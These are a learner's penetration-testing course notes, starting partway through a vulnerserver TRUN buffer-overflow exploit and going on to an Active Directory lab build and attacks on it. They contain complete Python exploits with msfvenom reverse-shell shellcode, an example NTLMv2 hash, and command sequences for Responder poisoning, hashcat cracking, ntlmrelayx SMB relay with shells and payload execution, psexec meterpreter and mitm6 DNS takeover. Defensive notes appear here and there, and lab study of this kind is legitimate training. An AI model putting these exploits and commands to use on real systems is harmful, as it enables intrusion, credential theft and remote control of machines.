m7Lm8Lm9Ln0Ln1Ln2Ln3Ln4Ln5Ln6Ln7Ln8Ln9Lo0Lo1Lo2Lo3Lo4Lo5Lo6Lo7Lo8Lo9Lp0Lp1Lp2Lp3Lp4Lp5Lp6Lp7Lp8Lp9Lq0Lq1Lq2Lq3Lq4Lq5Lq6Lq7Lq8Lq9Lr0Lr1Lr2Lr3Lr4Lr5Lr6Lr7Lr8Lr9Ls0Ls1Ls2Ls3Ls4Ls5Ls6Ls7Ls8Ls9Lt0Lt1Lt2Lt3Lt4Lt5Lt6Lt7Lt8Lt9Lu0Lu1Lu2Lu3Lu4Lu5Lu6Lu7Lu8Lu9Lv0Lv1Lv2Lv3Lv4Lv5Lv6Lv7Lv8Lv9Lw0Lw1Lw2Lw3Lw4Lw5Lw6Lw7Lw8Lw9Lx0Lx1Lx2Lx3Lx4Lx5Lx6Lx7Lx8Lx9Ly0Ly1Ly2Ly3Ly4Ly5Ly6Ly7Ly8Ly9Lz0Lz1Lz2Lz3Lz4Lz5Lz6Lz7Lz8Lz9Ma0Ma1Ma2Ma3Ma4Ma5Ma6Ma7Ma8Ma9Mb0Mb1Mb2Mb3Mb4Mb5Mb6Mb7Mb8Mb9Mc0Mc1Mc2Mc3Mc4Mc5Mc6Mc7Mc8Mc9Md0Md1Md2Md3Md4Md5Md6Md7Md8Md9Me0Me1Me2Me3Me4Me5Me6Me7Me8Me9Mf0Mf1Mf2Mf3Mf4Mf5Mf6Mf7Mf8Mf9Mg0Mg1Mg2Mg3Mg4Mg5Mg6Mg7Mg8Mg9Mh0Mh1Mh2Mh3Mh4Mh5Mh6Mh7Mh8Mh9Mi0Mi1Mi2Mi3Mi4Mi5Mi6Mi7Mi8Mi9Mj0Mj1Mj2Mj3Mj4Mj5Mj6Mj7Mj8Mj9Mk0Mk1Mk2Mk3Mk4Mk5Mk6Mk7Mk8Mk9Ml0Ml1Ml2Ml3Ml4Ml5Ml6Ml7Ml8Ml9Mm0Mm1Mm2Mm3Mm4Mm5Mm6Mm7Mm8Mm9Mn0Mn1Mn2Mn3Mn4Mn5Mn6Mn7Mn8Mn9Mo0Mo1Mo2Mo3Mo4Mo5Mo6Mo7Mo8Mo9Mp0Mp1Mp2Mp3Mp4Mp5Mp6Mp7Mp8Mp9Mq0Mq1Mq2Mq3Mq4Mq5Mq6Mq7Mq8Mq9Mr0Mr1Mr2Mr3Mr4Mr5Mr6Mr7Mr8Mr9Ms0Ms1Ms2Ms3Ms4Ms5Ms6Ms7Ms8Ms9Mt0Mt1Mt2Mt3Mt4Mt5Mt6Mt7Mt8Mt9Mu0Mu1Mu2Mu3Mu4Mu5Mu6Mu7Mu8Mu9Mv0Mv1Mv2M"

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.203.133',9999))
	s.send((b'TRUN /.:/' + offset + b'\r\n'))
	s.close()
except:
	print ("Error connecting to server")
	sys.exit()
```


![[Pasted image 20230121141703.png]]

``` 
EIO 386F4337
```

``` 
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 10000 -q 386F4337
```

![[Pasted image 20230121141857.png]]

``` 
[*] Exact match at offset 2003
```


### Overwriting the EIP

``` 
#!/usr/bin/python
 
import sys, socket
 
shellcode = b"A" * 2003 + b"B" * 4

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.203.133',9999))
	s.send((b'TRUN /.:/' + shellcode + b'\r\n'))
	s.close()
except:
	print ("Error connecting to server")
	sys.exit()
```

![[Pasted image 20230121143449.png]]

### Finding Bad Characters

> [!info] 
> badchars (bad characters which will break our shell)
> [https://github.com/cytopia/badchars](https://github.com/cytopia/badchars) 


**Copy this block:**

![[Pasted image 20230121143713.png]]

![[Pasted image 20230121144916.png]]

> [!caution] 
> vulnserver.exe doesn't have bad characters. But in other examples, we have to find all out of order characters. 01 02 03 04 05 06 and so on. 

![[Pasted image 20230121145800.png]]

Example of Dump which has bad characters:

![[Pasted image 20230121145206.png]]

> [!tip] 
> Normally better take one character more out if you unsure if character is bad. Because your shell will still work. 


### Finding the Right Module

> [!info] 
> **What is mona.py?**
> Mona.py is a python script that can be used to automate and speed up specific searches while developing exploits (typically for the Windows platform). It runs on Immunity Debugger and WinDBG, and requires python 2.7. Although it runs in WinDBG x64, the majority of its features were written specifically for 32bit processes.
> 
> https://github.com/corelan/mona 

![[Pasted image 20230121150841.png]]

``` 
!mona modules
```

Find unprotected DLL:

![[Pasted image 20230121151257.png]]

![[Pasted image 20230121151429.png]]

``` 
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
```

![[Pasted image 20230121151528.png]]

``` 
!mona find -s "\xff\xe4" -m essfunc.dll
```

![[Pasted image 20230121151832.png]]

![[Pasted image 20230121152031.png]]

``` 
625011AF
```

![[Pasted image 20230121165143.png]]

> [!info] 
> Press F2 to set break point:
> 


![[Pasted image 20230121165348.png]]

``` 
#!/usr/bin/python
 
import sys, socket

# revese of 62 50 11 AF
shellcode = "A" * 2003 + "\xaf\x11\x50\x62"

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.203.133',9999))
	s.send((b'TRUN /.:/' + shellcode.encode() + b'\r\n'))
	s.close()
except:
	print ("Error connecting to server")
	sys.exit()
```

![[Pasted image 20230121165915.png]]

### Generating Shellcode and Gaining Root

> [!fail] 
> In my environment Exploit didn't work ... 
> Update: In next Video I found soulution, most likly because I try to run it with Python3...

``` 
# -b is bad character(s)
msfvenom -p windows/shell_reverse_tcp lhost=192.168.203.132 lport=4444  exitfunc=thread -f c -a x86 -b "\x00"
```

``` 
#!/usr/bin/python
 
import sys, socket

overflow = (
"\xd9\xcc\xba\x0b\x6d\x42\x67\xd9\x74\x24\xf4\x5d\x2b\xc9"
"\xb1\x52\x31\x55\x17\x03\x55\x17\x83\xe6\x91\xa0\x92\x04"
"\x81\xa7\x5d\xf4\x52\xc8\xd4\x11\x63\xc8\x83\x52\xd4\xf8"
"\xc0\x36\xd9\x73\x84\xa2\x6a\xf1\x01\xc5\xdb\xbc\x77\xe8"
"\xdc\xed\x44\x6b\x5f\xec\x98\x4b\x5e\x3f\xed\x8a\xa7\x22"
"\x1c\xde\x70\x28\xb3\xce\xf5\x64\x08\x65\x45\x68\x08\x9a"
"\x1e\x8b\x39\x0d\x14\xd2\x99\xac\xf9\x6e\x90\xb6\x1e\x4a"
"\x6a\x4d\xd4\x20\x6d\x87\x24\xc8\xc2\xe6\x88\x3b\x1a\x2f"
"\x2e\xa4\x69\x59\x4c\x59\x6a\x9e\x2e\x85\xff\x04\x88\x4e"
"\xa7\xe0\x28\x82\x3e\x63\x26\x6f\x34\x2b\x2b\x6e\x99\x40"
"\x57\xfb\x1c\x86\xd1\xbf\x3a\x02\xb9\x64\x22\x13\x67\xca"
"\x5b\x43\xc8\xb3\xf9\x08\xe5\xa0\x73\x53\x62\x04\xbe\x6b"
"\x72\x02\xc9\x18\x40\x8d\x61\xb6\xe8\x46\xac\x41\x0e\x7d"
"\x08\xdd\xf1\x7e\x69\xf4\x35\x2a\x39\x6e\x9f\x53\xd2\x6e"
"\x20\x86\x75\x3e\x8e\x79\x36\xee\x6e\x2a\xde\xe4\x60\x15"
"\xfe\x07\xab\x3e\x95\xf2\x3c\x81\xc2\x37\x38\x69\x11\xc7"
"\x50\x36\x9c\x21\x38\xd6\xc8\xfa\xd5\x4f\x51\x70\x47\x8f"
"\x4f\xfd\x47\x1b\x7c\x02\x09\xec\x09\x10\xfe\x1c\x44\x4a"
"\xa9\x23\x72\xe2\x35\xb1\x19\xf2\x30\xaa\xb5\xa5\x15\x1c"
"\xcc\x23\x88\x07\x66\x51\x51\xd1\x41\xd1\x8e\x22\x4f\xd8"
"\x43\x1e\x6b\xca\x9d\x9f\x37\xbe\x71\xf6\xe1\x68\x34\xa0"
"\x43\xc2\xee\x1f\x0a\x82\x77\x6c\x8d\xd4\x77\xb9\x7b\x38"
"\xc9\x14\x3a\x47\xe6\xf0\xca\x30\x1a\x61\x34\xeb\x9e\x81"
"\xd7\x39\xeb\x29\x4e\xa8\x56\x34\x71\x07\x94\x41\xf2\xad"
"\x65\xb6\xea\xc4\x60\xf2\xac\x35\x19\x6b\x59\x39\x8e\x8c"
"\x48")


# revese of 62 50 11 AF
# \x90 is nops (no operation)
shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 1024  + overflow

payload = 'TRUN /.:/' + shellcode  + '\r\n'

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.203.133',9999))
	s.send((payload.encode()))
	s.close()
except:
	print ("Error connecting to server")
	sys.exit()
```


### Exploit Development Using Python3 and Mona

> [!tip] 
>In Immunity Debugger, the command "!mona bytearray -cpb "\x00"" is used to generate a sequence of bytes that can be used for testing buffer overflow vulnerabilities in a target application.
> `!mona bytearray -cpb "\x00"` 

![[Pasted image 20230408184704.png]]

![[Pasted image 20230408184834.png]]

> [!todo] 
> Finding Bad characters:, use ESP you see in your Immunity Debugger
> `!mona compare -f c:\mona\bytearray.bin -a 010AF9C8` 

![[Pasted image 20230408185226.png]]

![[Pasted image 20230408185527.png]]

> [!todo] 
> Use mona to find Jump Address:
> `!mona jmp -r ESP -m "essfunc.dll"` 

![[Pasted image 20230408185856.png]]

![[Pasted image 20230408185924.png]]


> [!success] 
>  Final exploit which is working:

``` 
#!/usr/bin/python3

import sys, socket
from time import sleep

overflow = (
b"\xdd\xc7\xb8\x32\x64\x94\x70\xd9\x74\x24\xf4\x5b\x29\xc9"
b"\xb1\x52\x31\x43\x17\x83\xeb\xfc\x03\x71\x77\x76\x85\x89"
b"\x9f\xf4\x66\x71\x60\x99\xef\x94\x51\x99\x94\xdd\xc2\x29"
b"\xde\xb3\xee\xc2\xb2\x27\x64\xa6\x1a\x48\xcd\x0d\x7d\x67"
b"\xce\x3e\xbd\xe6\x4c\x3d\x92\xc8\x6d\x8e\xe7\x09\xa9\xf3"
b"\x0a\x5b\x62\x7f\xb8\x4b\x07\x35\x01\xe0\x5b\xdb\x01\x15"
b"\x2b\xda\x20\x88\x27\x85\xe2\x2b\xeb\xbd\xaa\x33\xe8\xf8"
b"\x65\xc8\xda\x77\x74\x18\x13\x77\xdb\x65\x9b\x8a\x25\xa2"
b"\x1c\x75\x50\xda\x5e\x08\x63\x19\x1c\xd6\xe6\xb9\x86\x9d"
b"\x51\x65\x36\x71\x07\xee\x34\x3e\x43\xa8\x58\xc1\x80\xc3"
b"\x65\x4a\x27\x03\xec\x08\x0c\x87\xb4\xcb\x2d\x9e\x10\xbd"
b"\x52\xc0\xfa\x62\xf7\x8b\x17\x76\x8a\xd6\x7f\xbb\xa7\xe8"
b"\x7f\xd3\xb0\x9b\x4d\x7c\x6b\x33\xfe\xf5\xb5\xc4\x01\x2c"
b"\x01\x5a\xfc\xcf\x72\x73\x3b\x9b\x22\xeb\xea\xa4\xa8\xeb"
b"\x13\x71\x7e\xbb\xbb\x2a\x3f\x6b\x7c\x9b\xd7\x61\x73\xc4"
b"\xc8\x8a\x59\x6d\x62\x71\x0a\x52\xdb\xb2\x4d\x3a\x1e\x44"
b"\x43\xe7\x97\xa2\x09\x07\xfe\x7d\xa6\xbe\x5b\xf5\x57\x3e"
b"\x76\x70\x57\xb4\x75\x85\x16\x3d\xf3\x95\xcf\xcd\x4e\xc7"
b"\x46\xd1\x64\x6f\x04\x40\xe3\x6f\x43\x79\xbc\x38\x04\x4f"
b"\xb5\xac\xb8\xf6\x6f\xd2\x40\x6e\x57\x56\x9f\x53\x56\x57"
b"\x52\xef\x7c\x47\xaa\xf0\x38\x33\x62\xa7\x96\xed\xc4\x11"
b"\x59\x47\x9f\xce\x33\x0f\x66\x3d\x84\x49\x67\x68\x72\xb5"
b"\xd6\xc5\xc3\xca\xd7\x81\xc3\xb3\x05\x32\x2b\x6e\x8e\x52"
b"\xce\xba\xfb\xfa\x57\x2f\x46\x67\x68\x9a\x85\x9e\xeb\x2e"
b"\x76\x65\xf3\x5b\x73\x21\xb3\xb0\x09\x3a\x56\xb6\xbe\x3b"
b"\x73")

shellcode = b"A" * 2003 + b"\xaf\x11\x50\x62" + b"\x90" * 16 + overflow

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.203.139',9999))

	payload = b"TRUN /.:/" + shellcode

	s.send((payload))
	s.close()
except:
	print ("Error connecting to server")
	sys.exit()
```

![[Pasted image 20230408184750.png]]


## Active Directory Overview

### Active Directory Overview

![[Pasted image 20230216144310.png]]

![[Pasted image 20230216144606.png]]

### Physical Active Directory Components

![[Pasted image 20230216145607.png]]

![[Pasted image 20230216160539.png]]

> [!attention] 
> We want to grab this file `Ntds.dit` 
> Contains User, Groups, Password Hashes from all Users


### Logical Active Directory Components

![[Pasted image 20230216161349.png]]

![[Pasted image 20230216161919.png]]

![[Pasted image 20230216162047.png]]

![[Pasted image 20230216162151.png]]

![[Pasted image 20230216162308.png]]

![[Pasted image 20230216162622.png]]

![[Pasted image 20230216162954.png]]

## Active Directory Lab Build

### Lab Overview and Requirements

![[Pasted image 20230216164233.png]]

### Downloading Necessary ISOs

![[Pasted image 20230216165853.png]]


> [!note] 
> Link: https://www.microsoft.com/en-us/evalcenter/
> 


> [!todo] 
> - Download Windows 11 Enterprise
> - Windows Server 2022

> [!hint] 
> Don't worry about 90 days of evaluation. It can work up to 1 Year or more. It just show warning. 
> 


### Setting Up the Domain Controllers

> [!info] 
> Install Windows Server in VMWare Workstation:
>-  No need to set password in Wizzard of VMWare
> - No need product key 
> - 60GB HD in multible files
> - No autostart
> - Remove Floppy Device in Settings of VM
> - Set NAT as Network
> - Set RAM to 4GB
> - Start VM and install OS (Ensure you choose version with `Desktop Experience`)
> - Install VM Tools
> - Type `Computer Name` in search and rename name to somthing `***-DC`
> - In `Server Management` Application -> `Manage` -> `Add Roles and Features` -> `Role-based or feature-based installation` -> `Next` -> Select `Active Dictionary Domain Services` -> `Next` -> `Next` -> `Install` -> Wait -> `Close` -> Click on Yellow Warning Icon left of `Manage` -> `Promote this server to a domain controller` -> `Add a new forest` -> put as name `***.local` -> Set Password -> `Next` -> `Next` -> `Next` ->`Next`  -> `Install` -> VM will reboot
> - Take Snapshot now

### Setting Up the User Machines


> [!note] 
>  Install two Windows 11 Workstation VM's:
>  - Same as step before
>  - Install OS
>  - When you see screen `Sign in with Microsoft`, choose `Domain join instead`
>  - Create user with any name and password
>  - Install VMWare Tools
>  - Duplicate VM and create other user on copy VM and change Computer name


### Setting Up Users, Groups, and Policies


> [!note] 
> In `Server Manager` -> `Tools` -> `Active Directory User and Computers` -> Create new `Organizational Unit` -> Name it `Groups` -> Next -> Now mouve all Service Users in `Users` to our `Group` Folder

![[Pasted image 20230218104241.png]]

![[Pasted image 20230218104227.png]]

> [!note] 
> Create new User 

![[Pasted image 20230218104442.png]]

![[Pasted image 20230218104535.png]]

> [!note] 
> Copy Domain Admin 

![[Pasted image 20230218104759.png]]

> [!todo] 
> Copy Administrator Account
> 

![[Pasted image 20230218105414.png]]

![[Pasted image 20230218105649.png]]

> [!info] 
> Now Users should look like this:
> 
![[Pasted image 20230218105744.png]]

> [!todo] 
> Setup File Share:

![[Pasted image 20230218105912.png]]

![[Pasted image 20230218105951.png]]

![[Pasted image 20230218110020.png]]

![[Pasted image 20230218110051.png]]

![[Pasted image 20230218110120.png]]


![[Pasted image 20230218110228.png]]

> [!todo] 
> 
Setup SQLServer 
> `setspn -a TREE-DC/SQLService.TREE.local:6011 TREE\SQLService`


![[Pasted image 20230218110647.png]]

> [!todo] 
> Check is Setup was succsesful:
>` setspn -T TREE.local -Q */*`

![[Pasted image 20230218110910.png]]

![[Pasted image 20230218110952.png]]

![[Pasted image 20230218115308.png]]

![[Pasted image 20230218115245.png]]

![[Pasted image 20230218115518.png]]

![[Pasted image 20230218115848.png]]![[Pasted image 20230218120040.png]]


### Joining Our Machines to the Domain

On one of client

![[Pasted image 20230218131015.png]]

![[Pasted image 20230218131040.png]]


> [!hint] 
> Check DomainController's IP 

![[Pasted image 20230218131153.png]]

![[Pasted image 20230218131814.png]]

![[Pasted image 20230218131856.png]]

![[Pasted image 20230218131931.png]]

![[Pasted image 20230218132000.png]]

![[Pasted image 20230218132036.png]]

![[Pasted image 20230218132418.png]]

> [!info] 
> Now we can login with one of normal users we have
> 

> [!todo] 
> Now we also Login with Domain Admin:
> User: `TREE\Administrator`
> Password: ....  

> [!info] 
> Add a Domain User as local admin
>  

![[Pasted image 20230218133627.png]]


> [!info] 
> Setup VM 2
> - Now go other Client Machine 
> - Add to Domain
> - Login as Domain Administrator

> [!todo] 
>  Add here two local Administrators:

![[Pasted image 20230218162125.png]]

> [!todo] 
> Also here share folder:


![[Pasted image 20230218162304.png]]

> [!info] 
> On DomainController, you can now see two clients:

![[Pasted image 20230218162631.png]]

> [!important] 
> Everything we setup is more or less just default setup how Domain Controller is normaly setup. So this setup could represent be a real world environment.  In next Chapters wi will start attacking this environment.


### Lab Build - (Cloud Alternative)


> [!tip] 
> Ethical Hacking Lessons — Building Free Active Directory Lab in Azure 
>  https://kamran-bilgrami.medium.com/ethical-hacking-lessons-building-free-active-directory-lab-in-azure-6c67a7eddd7f


## Attacking Active Directory: Initial Attack Vectors

### Introduction

> [!tip] 
> Top Five Ways I Got Domain Admin:
>  https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa


> [!note] 
> Attacking AD
> Initial Attack Vectors
> 


### LLMNR Poisoning Overview

![[Pasted image 20230219094355.png]]

> [!info] 
> It response with username and password hash
> 

![[Pasted image 20230219094550.png]]

![[Pasted image 20230219094733.png]]

> [!attention] 
> Start this tool early in morning or after lunch, when a lot of user login to DC account. Because we need a lot of traffic for this.
> 

> [!info] 
> Now if someone put wrong dns name, we're listening in middle 

![[Pasted image 20230219124159.png]]

![[Pasted image 20230219124243.png]]

![[Pasted image 20230219124336.png]]


### Capturing NTLMv2 Hashes with Responder

> [!todo] 
>  In Kali run `sudo responder -I eth0 -rdwv`
>  for me parameter `-rdwv` gave error. 
> I try it with following command `sudo responder -I eth0 -Adwv`

![[Pasted image 20230219150535.png]]

> [!todo] 
> On victim VM, try smb to Kali VM IP
> `\\x.x.x.x`


![[Pasted image 20230219150616.png]] 

![[Pasted image 20230219150701.png]]

### Password Cracking with Hashcat

> [!todo] 
> Take hash:
> ``` 
fcastle::TREE:51934501eb00515e:9ABE5E3F30739166896A5BEEA3D0621F:0101000000000000803D30EA7644D9011CF5B5FE62CB368F00000000020008004500470037004C0001001E00570049004E002D005600500035004100360031005000500030004500410004003400570049004E002D00560050003500410036003100500050003000450041002E004500470037004C002E004C004F00430041004C00030014004500470037004C002E004C004F00430041004C00050014004500470037004C002E004C004F00430041004C0007000800803D30EA7644D9010600040002000000080030003000000000000000010000000020000060371BB1529D9A70E5181D74CA4682474F4BCAF428F7BB2E0BD38B3A69F4453D0A001000000000000000000000000000000000000900280063006900660073002F003100390032002E003100360038002E003200300033002E003100320038000000000000000000

> [!todo] 
>  See all types of supported hashes in hashcat:
>  `hashcat --help`

![[Pasted image 20230219153320.png]]

![[Pasted image 20230219153445.png]]

> [!todo] 
> Crack hash we catched (if you run it in VM you have to add `--force` parram):
> `hashcat -m 5600 Desktop/ntlmv2_hash.txt rockyou.txt --force` 

> [!attention] 
> You normally should run it on host system itself and not VM to have GPU support and faster cracking !!
> Here link to binary for different plattforms:
> https://hashcat.net/hashcat/

> [!info] 
> Example of alternative wordlist:
> https://github.com/initstring/passphrase-wordlist 

> [!info] 
> On Windows:
> `hashcat -m 5600 ntlmv2_hash.txt rockyou.txt  -O` 

![[Pasted image 20230219155148.png]]

### LLMNR Poisoning Defense

![[Pasted image 20230311154640.png]]

> [!info] 
> Send to client how to fix Issue or put it in report
> 

> [!tip] 
> Inform customer about risk of short passwords. 
> 

### SMB Relay Attacks Overview

![[Pasted image 20230311161827.png]]

![[Pasted image 20230311162545.png]]

> [!todo] 
> We only capture to SMB, but don't interact:
> Adjust `Responder.conf`
> `sudo pico /usr/share/responder/Responder.conf`
> We use other tool to relay
> 

![[Pasted image 20230311163155.png]]

> [!todo] 
> Start responder:
> `sudo responder -I eth0 -Adwv` 

![[Pasted image 20230311170128.png]]

> [!todo] 
> Install ntlmrelayx on Kali:
> https://www.kali.org/tools/impacket/
> `sudo apt install python3-impacket`

> [!todo] 
> Run SMB Relay
> `impacket-ntlmrelayx -tf targets.txt -smb2support` 

> [!caution] 
> Don't forget that this attack is only working if you're Administrator on Computer. 

![[Pasted image 20230311175315.png]]

### Quick Lab Update

> [!attention] 
> That is attack is working we have to enable `Network Discovery` 
> We have to this on both on our VMs

![[Pasted image 20230311181427.png]]

### Discovering Hosts with SMB Signing Disabled

> [!faq] 
>  **Question**: My SMB relay is not working. How do I resolve?
>  ---
>  **Resolution**: There have been reports that SMB is failing to relay for some users in their labs. If this is happening, attempt to navigate to the attacker’s IP address from a web browser (such as \192.168.10.1) instead of the SMB event. You should trigger a relay.

> [!tip] 
> - You could  run a Nessus scan to get hosts with SMB Signing Disabled
> - Also via `nmap` scan
> - Search on github for it

> [!todo] 
>  **nmap scan**
>  `sudo nmap --script=smb2-security-mode.nse -p445 192.168.203.0/24`

> [!caution] 
> Run command as root, otherwise you will not get any detail information
> 

![[Pasted image 20230311184012.png]]

> [!todo] 
> Put a target IP which not required signing  to `targets.txt`

### SMB Relay Attack Demonstration Part 1

![[Pasted image 20230311184946.png]]

> [!todo] 
> Run command:
>  `sudo responder -I eth0 -Adwv`

> [!todo] 
> Run command:
> `sudo impacket-ntlmrelayx -tf targets.txt -smb2support`  

![[Pasted image 20230311185520.png]]

> [!todo] 
> Start responder:
> `sudo responder -I eth0 -Adwv` 

> [!todo] 
> On Windows VM, put IP of Kali Machine:
> `\\ip-kali-machine`

![[Pasted image 20230311190013.png]]

![[Pasted image 20230313115943.png]]

> [!info] 
> Now having possiblility to crack hashes offline
> 


### SMB Relay Attack Demonstration Part 2

> [!todo] 
>` sudo responder -I eth0 -dwv`
> 
> Interactive Shell:
>  `sudo impacket-ntlmrelayx -tf targets.txt -smb2support -i`

![[Pasted image 20230313124200.png]]

> [!todo] 
> Connect to shell via NC
> `nc 127.0.0.1 11000` 

![[Pasted image 20230313124447.png]]

> [!tip] 
> Can create payload with msfvenom:
> `sudo impacket-ntlmrelayx -tf targets.txt -smb2support -e test.exe` 
> -----
> Run specific command:
> `sudo impacket-ntlmrelayx -tf targets.txt -smb2support -c "some command"` 

### SMB Relay Attack Defenses

![[Pasted image 20230313125306.png]]

### Gaining Shell Access

> [!todo] 
> Start Metasploit:
> `msfconsole`
> Search for `psexec` 

![[Pasted image 20230313125727.png]]

> [!todo] 
> Set Options:
> `set rhosts 192.168.230.137` 
> `set smbdomain marvel.local`
> `set smbpass Password1`
> `set smbuser fcastle`
> `set payload windows/x64/meterpreter/reverse_tcp`
> `set lhost eth0`
> `run`

![[Pasted image 20230313153648.png]]

> [!todo] 
> `show targets`
> `set target 2`

 ![[Pasted image 20230314072936.png]]

> [!fail] 
> No luck, Windows Defender blocked our attack:

![[Pasted image 20230314073135.png]] 

> [!fail] 
> Other try:
> `impacket-psexec marvel.local/fcastle:Password1@192.168.203.137`
> At time of course recording, Windows Defender not catch this Attack. But now it catch attack. 

> [!fail] 
> Same problem with:
> `impacket-wmiexec  marvel.local/fcastle:Password1@192.168.203.137` 

> [!tip] 
>  Deactivate Windows Defender allows this attack

![[Pasted image 20230314075345.png]]

### IPv6 Attacks Overview

> [!hint] 
> There is a good chance that there is IPv6 enabled in Network but not setup and no DNS Server configured. This is place where we jump in.
> 

![[Pasted image 20230314080007.png]]

### Installing mitm6

> [!todo] 
> Download:
> `git clone https://github.com/dirkjanm/mitm6`
> `sudo -s`
> `pip3 install -r requirements.txt`

### Setting Up LDAPS

![[Pasted image 20230314081214.png]]

> [!todo] 
> Next, Next
> 

![[Pasted image 20230314081256.png]]

> [!todo] 
> Next, Next, Next, Install, Close

![[Pasted image 20230314081427.png]]

![[Pasted image 20230314081457.png]]

### IPv6 DNS Takeover via mitm6

> [!info] 
> Resources for this video:
>  - mitm6: [https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/) 
>  - Combining NTLM Relays and Kerberos Delegation: [https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/)

> [!faq] 
>**Question**: My ntlmrelayx is giving an error during the attack. How can I resolve?
  **Resolution**: Impacket versions > 0.9.19 are unstable and causing issues for students and pentesters alike. Try purging impacket completely and downloading 0.9.19 from here: [https://github.com/SecureAuthCorp/impacket/releases](https://github.com/SecureAuthCorp/impacket/releases)

> [!todo] 
> Run mitm6:
> `sudo -s`
> `sudo mitm6 -d marvel.local` 

![[Pasted image 20230315075658.png]]

> [!todo]  
> Run Relay Attack (IP of DC):
> `impacket-ntlmrelayx -6 -t ldaps://192.168.203.136 -wh fakewpad.marvel.local -l lootme
`

> [!todo] 
> Reboot Domain Controller.
> Normally DC refresh DNS every 30 min. With Reboot we speed up this process.

![[Pasted image 20230315080145.png]]

![[Pasted image 20230315080248.png]]

> [!todo] 
> Run:
> `firefox domain_users_by_group.html`  

![[Pasted image 20230315080459.png]]

> [!todo] 
> Login with Domain Admininistrator to our Windows 10 VM
> 

> [!info] 
> Take Over Domain Controller
> 

> [!warning] 
> Fix :  (All commands are executed on the Domain Controller)
>  start / run / cmd  ( as administrator )
>  `powershell -ep bypass`
>  `Uninstall-AdcsCertificationAuthority`
>  hit A for all 
>  Reboot the DC 
>  ---
>  Login to DC as Administrator 
>  start / run / cmd (as administrator)
>  `powershell -ep bypass`
>  (command is one very long line not multiple lines)
>  `Install-AdcsCertificationAuthority -CAType EnterpriseRootCa -CryptoProviderName "RSA#Microsoft Software Key Storage Provider" -KeyLength 2048 -HashAlgorithmName SHA1 -ValidityPeriod Years -ValidityPeriodUnits 99`
>  hit A for all 
>  Reboot the DC
>  ---
>  Login to DC
>  Re-attempt attack in kali
>  `sudo mitm6 -d marvel.local`
> `sudo ntlmrelayx.py -6 -t ldaps://your.dc.ip.here -wh fakewpad.marvel.local -l lootme`

![[Pasted image 20230316100736.png]]

![[Pasted image 20230316100820.png]]

![[Pasted image 20230316101259.png]]

> [!tip] 
> IPv6 Attacks are very powerful, see more in detailed article here:
> https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/
> **The mitm6 attack**
> - Attack phase 1 – Primary DNS takeover
> - Attack phase 2 – DNS spoofing
> - Exploiting WPAD (Windows Proxy Auto Detection)
> - The full attack
> - Defenses and mitigations
> - Detection
> ---
> The worst of both worlds: Combining NTLM Relaying and Kerberos delegation
> https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/
> `Example of insecure Active Directory default`
> - Attack TL;DR
> - No credentials, no problem
> 	- By default, any user in Active Directory can create up to 10 computer accounts
> 	- Computer account credentials can be used for all kinds of things in AD, such as querying domain information or even running BloodHound:
> - Relaying and configuring delegation
> - Other abuse avenues
> - Tools
> - Mitigations

### IPv6 Attack Defenses

![[Pasted image 20230316104911.png]]

### Passback Attacks

> [!info] 
>  A Pen Tester’s Guide to Printer Hacking
>  https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack/

![[Pasted image 20230316110458.png]]

> [!tip] 
> **Passback Attack:**
> If you can't see Password on device, point IP to your device and you can see request with credentials. 
> 


### Other Attack Vectors and Strategies

![[Pasted image 20230316110928.png]]

> [!info] 
> http_version is a Module in Metasploit to look for Websites inside network.
> 

> [!tip] 
> A printer can give you in some cases Domain Admin Access
> Scan and Share feature sometimes use Domain Admin to save scans via SMB

> [!hint] 
> Always look up default credential of services / sites you discover inside network
> 


## Attacking Active Directory: Post-Compromise Enumeration

### PowerView Overview

> [!info] 
> Download PowerView:
> https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
> 

### Domain Enumeration with PowerView

> [!info] 
>  Resources for this video:
>  PowerView Cheat Sheet: [https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)

> [!todo] 
> - Open `cmd` on Windows Machine 
> - `powershell -ep bypass`
> - Load PowerView: `. .\PowerView.ps1`
> - `Get-NetDomain`
> - `Get-NetDomainController`
> - `Get-DomainPolicy`
> - `(Get-DomainPolicy)."SystemAccess"`
> - `Get-NetUser`
> - `Get-NetUser | select cn`
> - `Get-NetUser | select Description`
> - `Get-DomainUser`
> - `Get-DomainUser -Properties pwdlastset`
> - `Get-DomainUser -Properties logoncount`
> - `Get-DomainUser -Properties badpwdcount`
> - `Get-NetComputer`
> - `Get-NetComputer | select OperatingSystem`
> - `Get-NetGroup`
> - `Invoke-ShareFinder`
> - `Get-NetGPO`
> - `Get-NetGPO | select displayname, whenchanged`

![[Pasted image 20230317064634.png]]

![[Pasted image 20230317064650.png]]

![[Pasted image 20230317065138.png]]

![[Pasted image 20230317065400.png]]

![[Pasted image 20230317065446.png]]

![[Pasted image 20230317065527.png]]

![[Pasted image 20230317065603.png]]

![[Pasted image 20230317082030.png]]

![[Pasted image 20230317082042.png]]

![[Pasted image 20230317082131.png]]
> [!warning] 
> If you see a user never logged in, maybe this is a **honeypot** account 

![[Pasted image 20230317082254.png]]

![[Pasted image 20230317082436.png]]

![[Pasted image 20230317082617.png]]

![[Pasted image 20230317082814.png]]

![[Pasted image 20230317083154.png]]

![[Pasted image 20230317083258.png]]

